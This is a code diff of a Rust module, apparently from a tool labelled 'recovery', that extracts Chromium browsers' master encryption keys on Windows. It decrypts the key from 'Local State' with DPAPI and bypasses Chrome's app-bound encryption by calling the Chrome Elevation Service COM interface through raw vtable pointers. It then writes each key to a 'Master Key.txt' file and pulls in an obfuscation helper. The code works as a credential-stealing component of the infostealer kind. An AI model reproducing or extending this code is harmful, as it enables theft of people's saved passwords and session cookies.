@@ -1,27 +1,38 @@
 use crate::recovery::browser::browsers::{BrowserName, browser_data_roots};
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::helpers::obfuscation::deobf;
-use crate::recovery::output::write_json_artifact;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use aes_gcm::aead::Aead;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
 use async_trait::async_trait;
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
-use serde::Serialize;
 use std::ffi::c_void;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
-use windows::Win32::Foundation::{HLOCAL, LocalFree};
-use windows::Win32::Security::Cryptography::{
+use tokio::fs;
+use windows_sys::Win32::Foundation::{HLOCAL, LocalFree};
+use windows_sys::Win32::Security::Cryptography::{
     CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
 };
-use windows::Win32::System::Com::{
+use windows_sys::Win32::System::Com::{
     CLSCTX_LOCAL_SERVER, COINIT_MULTITHREADED, CoCreateInstance, CoInitializeEx,
 };
-use windows::core::{GUID, HRESULT, HSTRING, Interface, PCWSTR};
+use windows_sys::core::GUID;
 
-const CLSID_ELEVATOR: GUID = GUID::from_u128(0x7088E230_021D_4a25_822E_013064E07F16);
+const IID_IUNKNOWN: GUID = GUID {
+    data1: 0x00000000,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
+};
+
+const CLSID_ELEVATOR: GUID = GUID {
+    data1: 0x7088E230,
+    data2: 0x021D,
+    data3: 0x4a25,
+    data4: [0x82, 0x2E, 0x01, 0x30, 0x64, 0xE0, 0x7F, 0x16],
+};
 
 pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     vec![Arc::new(ChromiumSecretsTask::new(ctx))]
@@ -39,42 +50,6 @@ impl ChromiumSecretsTask {
     }
 }
 
-impl ChromiumSecretsTask {
-    async fn gather(&self) -> Vec<ChromiumSecretRecord> {
-        let mut records = Vec::new();
-
-        for (browser, root) in &self.specs {
-            let local_state = root.join("Local State");
-            let mut record = ChromiumSecretRecord {
-                browser: browser.label().to_string(),
-                local_state: local_state.display().to_string(),
-                master_key: None,
-                error: None,
-            };
-
-            if !local_state.exists() {
-                record.error = Some("local state missing".to_string());
-            } else {
-                match extract_master_key(&local_state) {
-                    Ok(Some(key)) => {
-                        record.master_key = Some(STANDARD.encode(&key));
-                    }
-                    Ok(None) => {
-                        record.error = Some("encrypted_key missing".to_string());
-                    }
-                    Err(err) => {
-                        record.error = Some(err.to_string());
-                    }
-                }
-            }
-
-            records.push(record);
-        }
-
-        records
-    }
-}
-
 #[async_trait]
 impl RecoveryTask for ChromiumSecretsTask {
     fn label(&self) -> String {
@@ -86,33 +61,35 @@ impl RecoveryTask for ChromiumSecretsTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let summary = ChromiumSecretSummary {
-            secrets: self.gather().await,
-        };
-        let artifact = write_json_artifact(
-            ctx,
-            self.category(),
-            &self.label(),
-            "chromium-secrets.json",
-            &summary,
-        )
-        .await?;
+        let mut artifacts = Vec::new();
 
-        Ok(vec![artifact])
+        for (browser, root) in &self.specs {
+            let local_state = root.join("Local State");
+            if !local_state.exists() {
+                continue;
+            }
+
+            if let Ok(Some(key)) = extract_master_key(&local_state) {
+                let master_key_b64 = STANDARD.encode(&key);
+                let browser_dir = ctx.output_dir.join("Browsers").join(browser.label());
+                let _ = fs::create_dir_all(&browser_dir).await;
+                
+                let target = browser_dir.join("Master Key.txt");
+                if let Ok(_) = tokio::fs::write(&target, &master_key_b64).await {
+                    if let Ok(meta) = tokio::fs::metadata(&target).await {
+                        artifacts.push(RecoveryArtifact {
+                            label: format!("{} Master Key", browser.label()),
+                            path: target,
+                            size_bytes: meta.len(),
+                            modified: meta.modified().ok(),
+                        });
+                    }
+                }
+            }
+        }
+
+        Ok(artifacts)
     }
-}
-
-#[derive(Serialize)]
-struct ChromiumSecretSummary {
-    secrets: Vec<ChromiumSecretRecord>,
-}
-
-#[derive(Serialize)]
-struct ChromiumSecretRecord {
-    browser: String,
-    local_state: String,
-    master_key: Option<String>,
-    error: Option<String>,
 }
 
 pub fn extract_master_key(local_state_path: &Path) -> Result<Option<Vec<u8>>, RecoveryError> {
@@ -183,26 +160,29 @@ fn dpapi_unprotect(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
             cbData: encrypted.len() as u32,
             pbData: encrypted.as_ptr() as *mut u8,
         };
-        let mut output = CRYPT_INTEGER_BLOB::default();
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
 
         let success = CryptUnprotectData(
             &mut input,
-            None,
-            None,
-            None,
-            None,
+            std::ptr::null_mut(),
+            std::ptr::null(),
+            std::ptr::null(),
+            std::ptr::null(),
             CRYPTPROTECT_UI_FORBIDDEN,
             &mut output,
         );
 
-        if success.is_err() {
+        if success == 0 {
             return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
         }
 
         let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
         let result = slice.to_vec();
         if !output.pbData.is_null() {
-            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
+            let _ = LocalFree(output.pbData as HLOCAL);
         }
         Ok(result)
     }
@@ -219,42 +199,58 @@ fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
     }
 
     unsafe {
-        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
+        let _ = CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED as u32);
 
-        let elevator: windows::core::IUnknown =
-            CoCreateInstance(&CLSID_ELEVATOR, None, CLSCTX_LOCAL_SERVER).map_err(|err| {
-                RecoveryError::Custom(format!(
-                    "failed to connect to Chrome Elevation Service: {err}"
-                ))
-            })?;
+        let mut elevator: *mut c_void = std::ptr::null_mut();
+        let hr = CoCreateInstance(
+            &CLSID_ELEVATOR,
+            std::ptr::null_mut(),
+            CLSCTX_LOCAL_SERVER,
+            &IID_IUNKNOWN,
+            &mut elevator,
+        );
 
-        let input_hstring = HSTRING::from(encoded);
+        if hr < 0 {
+            return Err(RecoveryError::Custom(format!(
+                "failed to connect to Chrome Elevation Service: {hr}"
+            )));
+        }
+
+        let input_wide: Vec<u16> = encoded.encode_utf16().chain(std::iter::once(0)).collect();
         let mut decrypted_ptr: *mut u16 = std::ptr::null_mut();
         let mut last_error: u32 = 0;
 
-        let vtable = *(elevator.as_raw() as *const *const usize);
+        let vtable = *(elevator as *const *const usize);
         let decrypt_data_ptr = *vtable.add(4);
         let decrypt_data_fn: unsafe extern "system" fn(
             this: *mut c_void,
-            encrypted_data: PCWSTR,
+            encrypted_data: *const u16,
             decrypted_data: *mut *mut u16,
             last_error: *mut u32,
-        ) -> HRESULT = std::mem::transmute(decrypt_data_ptr);
+        ) -> i32 = std::mem::transmute(decrypt_data_ptr);
 
         let hr = decrypt_data_fn(
-            elevator.as_raw(),
-            PCWSTR(input_hstring.as_ptr()),
+            elevator,
+            input_wide.as_ptr(),
             &mut decrypted_ptr,
             &mut last_error,
         );
 
-        hr.ok().map_err(|err| {
-            RecoveryError::Custom(format!(
-                "COM DecryptData failed: {err} (last_error: {last_error})"
-            ))
-        })?;
+        if hr < 0 {
+            let release_ptr = *vtable.add(2);
+            let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
+                std::mem::transmute(release_ptr);
+            release_fn(elevator);
+            return Err(RecoveryError::Custom(format!(
+                "COM DecryptData failed: {hr} (last_error: {last_error})"
+            )));
+        }
 
         if decrypted_ptr.is_null() {
+            let release_ptr = *vtable.add(2);
+            let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
+                std::mem::transmute(release_ptr);
+            release_fn(elevator);
             return Err(RecoveryError::Custom(
                 "decryption returned null pointer".into(),
             ));
@@ -266,12 +262,15 @@ fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
         }
 
         let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, len);
-        let decrypted_hstring = HSTRING::from_wide(decrypted_slice).unwrap_or_default();
-        let _ = LocalFree(HLOCAL(decrypted_ptr as *mut c_void));
+        let decrypted_string = String::from_utf16_lossy(decrypted_slice);
+        let _ = LocalFree(decrypted_ptr as HLOCAL);
 
-        let master_key_b64 = decrypted_hstring.to_string();
+        let release_ptr = *vtable.add(2);
+        let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
+            std::mem::transmute(release_ptr);
+        release_fn(elevator);
 
-        let master_key = STANDARD.decode(&master_key_b64).map_err(|err| {
+        let master_key = STANDARD.decode(&decrypted_string).map_err(|err| {
             RecoveryError::Custom(format!("base64 decode of decrypted key failed: {err}"))
         })?;
 
